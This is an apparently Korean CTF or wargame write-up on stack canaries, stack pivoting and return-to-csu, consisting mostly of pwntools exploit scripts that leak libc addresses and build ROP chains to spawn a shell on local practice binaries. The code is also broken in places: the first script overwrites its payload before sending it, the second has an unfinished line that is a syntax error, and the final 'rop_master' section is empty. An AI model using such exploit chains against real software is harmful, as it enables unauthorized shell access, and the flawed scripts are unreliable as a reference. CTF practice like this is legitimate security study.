# Canary & Stack pivoting & RTC

[선택2]  

## 1 csu_example

프로그램이 실행되기 전에 실행되는 __libc_csu_init() 함수로 return하여 원하는 명령을 실행할 수 있다. 먼저 csu2로 return하여 write의 실제 주소를 출력하기 위한 인자를 입력한 뒤 csu1으로 return한다. 이후 한 번 더 실행되므로 bss영역에 read함수를 쓸 수 있다. 그 다음 rsp에 bss영역의 주소를 넣고 leave와 ret를 하여 stack pivoting을 진행하고, 더미를 입력한 뒤 RTL 하면 쉘을 얻을 수 있다. 


```python
from pwn import *

p = process("./csu_example")
e = ELF("./csu_example")
libc = e.libc

csu1 = 0x4006c0
csu2 = 0x4006d6
write_got = e.got['write']
read_got = e.got['read']
leave_ret = 0x00400672
pop_rdi = 0x004006e3
bss = e.bss() + 0x400

# write(1, write_got, 8)
payload = b'A'*0x100
payload += p64(csu2)
payload += b'B'*0x8
payload += p64(0) #rbx
payload += p64(1) #rbp
payload += p64(write_got) #r12
payload += p64(1) #r13->edi
payload += p64(write_got) #r14->rsi
payload += p64(8) #r15->rdx
payload += p64(csu1)

# read(0, bss, 0x150)
payload += b'C'*0x8
payload += p64(0) #rbx
payload += p64(1) #rbp
payload += p64(read_got) #r12
payload += p64(0) #r13->edi
payload += p64(bss) #r14->rsi
payload += p64(0x150) #r15->rdx
payload += p64(csu1)

# rbp->bss : stack pivoting
payload = b'D'*16
payload += p64(bss)
payload += b'D'*32
payload += p64(leave_ret)

p.send(payload)

write_offset = libc.symbols['write']
system_offset = libc.symbols['system']
p.recvline()
write_addr = u64(p.recv(8).ljust(8, '\x00'))
libc_base = write_addr - write_offset

system_addr = libc_base + system_offset
binsh = libc_base + list(libc.search(b'/bin/sh'))[0]


# system('/bin/sh')
payload = b'E'*8
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(0x004004c6) #ret sled
payload += p64(system_addr)

p.send(payload)


p.interactive()


```



## 2 Pivot2

2bytes밖에 bof가 일어나지 않지만 Stack Pivoting을 이용하여 SFP를 덮을 수 있다. 그 이유는 SFP의 주소가 buf주소와 1.5byte 정도 차이가 나기 때문이다. SFP의 끝 2bytes를 buf의 끝 2bytes로 덮어주면 fake stack을 형성하여 payload를 실행할 수 있다.


```python
from pwn import *

p = process('./pivot2')
e = ELF('./pivot2')
libc = e.libc


buf_addr = int(p.recv(14), 16)
buf_addr_bof = buf_addr % 0x10000


payload = b'A'*0x8
payload += 
payload += b'B'*(0x100-len(payload))
payload += p64(buf_addr_bof)


#write(1, write_got, 8)
#system('/bin/sh')

p.send(payload)




p.interactive()

```


## 3 rop_master






